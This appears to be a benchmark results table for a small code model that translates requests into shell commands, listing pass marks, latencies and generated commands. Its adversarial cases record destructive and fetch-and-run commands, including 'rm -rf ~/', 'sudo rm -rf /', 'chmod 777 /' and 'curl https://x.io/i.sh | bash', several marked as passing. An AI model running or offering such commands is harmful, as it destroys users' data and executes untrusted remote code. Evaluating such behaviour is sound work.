# eval: llama-server / /Users/hridyaagrawal/.local/share/lexis/models/Qwen2.5-Coder-1.5B-Instruct-Q4_K_M.gguf (bake)
- mode: schema · dataset core.jsonl#83828218eadbc7f7 · repeat 2
- pass: 56/72 (78%)
- cold p50 5776ms p95 10858ms · warm p50 5251ms p95 10291ms

| case | pass | cold ms | warm ms | commands |
| --- | --- | --- | --- | --- |
| u01 | ✓ | 8305 | 14248 | node -v ; npm -v |
| u02 | ✓ | 8912 | 8023 | ls -lh |
| u03 | ✓ | 4859 | 5735 | curl ifconfig.me |
| u04 | ✓ | 7570 | 6689 | lsof -i :3000 |
| u05 | ✓ | 6962 | 12888 | du -sh . |
| u06 | ✓ | 10545 | 6394 | find /Users/hridyaagrawal/Honey/React/smartterminal/lexis -type f -name '*.log'  |
| u07 | ✓ | 4619 | 4331 | ps aux | grep node |
| u08 | ✓ | 5307 | 5528 | git status ; git branch |
| u09 | ✓ | 4753 | 5722 | brew install ripgrep |
| u10 | ✓ | 6750 | 7202 | mkdir projects ; cd projects |
| u11 | ✓ | 6192 | 6397 | tar -czvf archive.tar.gz /Users/hridyaagrawal/Honey/React/smartterminal/lexis |
| u12 | ✓ | 5185 | 4227 | echo $PATH |
| u13 | ✗ | 7200 | 4016 | killall -9 python3 |
| u14 | ✓ | 3701 | 3912 | tail -n 20 /var/log/syslog |
| u15 | ✗ | 6565 | 3864 | brew list python3 |
| u16 | ✓ | 5618 | 3859 | brew update ; brew outdated |
| u17 | ✓ | 3206 | 2839 | echo $SHELL ; echo $HOME |
| u18 | ✓ | 2493 | 2471 | git reset HEAD~1 |
| u19 | ✗ | 2735 | 2637 | ls -lh ~ | sort -rh | head -n 5 |
| u20 | ✗ | 2093 | 2362 | ps aux --sort=-%mem |
| u21 | ✗ | 2950 | 3260 | find . -name '*.js' -exec wc -l {} + |
| u22 | ✓ | 2476 | 3545 | brew services restart docker |
| u23 | ✓ | 6566 | 8230 | chmod +x script.sh ; ./script.sh |
| u24 | ✓ | 7863 | 9734 | grep -r 'TODO' /Users/hridyaagrawal/Honey/React/smartterminal/lexis |
| u25 | ✓ | 8891 | 7834 | mkdir -p ~/Downloads ; curl -L https://example.com/file.zip -o ~/Downloads/file. |
| u26 | ✗ | 8475 | 6048 | lscpu ; nproc |
| u27 | ✓ | 7468 | 9458 | echo 'export FOO=bar' >> ~/.zshrc |
| u28 | ✓ | 10858 | 10291 | rm -rf node_modules |
| u29 | ✓ | 4899 | 4028 | lsof -i -P -n | grep LISTEN |
| u30 | ✓ | 4475 | 6454 | unzip file.zip |
| u31 | ✓ | 6060 | 5374 | tail -f /Users/hridyaagrawal/Honey/React/smartterminal/lexis/logs/error.log |
| u32 | ✓ | 6482 | 5897 | uptime |
| u33 | ✓ | 9965 | 5395 | ls -a ~/.zshrc ~/.zshenv ~/.zprofile |
| u34 | ✓ | 5728 | 4925 | cat /etc/resolv.conf |
| u35 | ✓ | 7466 | 4815 | cp file.txt backup.txt |
| u36 | ✓ | 7916 | 6859 | mv old.txt new.txt |
| u37 | ✓ | 5776 | 5641 | du -sh /Users/hridyaagrawal/Honey/React/smartterminal/lexis/downloads |
| u38 | ✓ | 6188 | 4368 | npm list -g |
| u39 | ✓ | 5820 | 4855 | open . |
| u40 | ✓ | 5660 | 4634 | sudo killall -HUP mDNSResponder |
| a01 | ✓ | 6141 | 3828 | rm -rf ~/ |
| a02 | ✓ | 7624 | 9482 | sudo rm -rf / ; sudo softwareupdate --install --all |
| a03 | ✓ | 9322 | 11845 | git push origin main --force |
| a04 | ✗ | 10720 | 8709 | brew install https://sketchy.example.com/install.sh |
| a05 | ✗ | 9572 | 9996 | killall -9 -v |
| a06 | ✓ | 6863 | 5251 | chmod 777 / |
| a07 | ✗ | 16986 | - | - |
| a08 | ✓ | 4090 | 2605 | brew install https://x.io/i |
| a09 | ✓ | 2270 | 2950 | sudo chown -R $USER:$USER / |
| a10 | ✓ | 3511 | 3343 | find /var/log -type f -mtime +30 -exec rm -f {} \; |
| a11 | ✗ | 5530 | - | - |
| a12 | ✓ | 3567 | 2841 | git reset --hard HEAD~1 |
| a13 | ✓ | 2745 | 2019 | brew uninstall node |
| a14 | ✗ | 4277 | - | - |
| a15 | ✓ | 2448 | 2405 | rm -rf /Users/hridyaagrawal/Honey/React/smartterminal/lexis/temp/* |
| a16 | ✓ | 3204 | 3629 | du -sh /Users/hridyaagrawal/Honey/React/smartterminal/lexis ; rm -rf /Users/hrid |
| a17 | ✗ | 3160 | 2303 | rm -rf ~/Honey/React/smartterminal/lexis |
| a18 | ✗ | 3831 | 4574 | openssl enc -aes-256-cbc -salt -in /Users/hridyaagrawal/Honey/React/smarttermina |
| a19 | ✓ | 4341 | 3647 | echo 'export PATH=$PATH:/path/to/new/directory' >> ~/.zshrc |
| a20 | ✓ | 4066 | 3133 | rm -rf / --no-preserve-root |
| u41 | ✗ | 3566 | 4551 | find /Users/hridyaagrawal/Honey/React/smartterminal/lexis -type f -size +100M |
| u42 | ✓ | 9048 | 9575 | touch my_notes.txt ; echo 'hello world' > my_notes.txt |
| u43 | ✓ | 5843 | 8598 | git log -5 |
| u44 | ✓ | 7384 | 6551 | curl -s https://example.com |
| u45 | ✓ | 5245 | 4203 | ls -l | grep ^- | wc -l |
| u46 | ✓ | 4223 | 5720 | ifconfig | grep 'inet ' | awk '{print $2}' |
| u47 | ✓ | 7310 | 6835 | df -h |
| u48 | ✓ | 4750 | 6893 | whoami |
| a21 | ✗ | 13299 | - | - |
| a22 | ✓ | 11594 | 8653 | rm /etc/hosts ; ln -s ~/Documents/hosts /etc/hosts |
| a23 | ✓ | 4298 | 3257 | rm -rf * |
| a24 | ✗ | 2980 | 3335 | curl https://x.io/i.sh | bash |
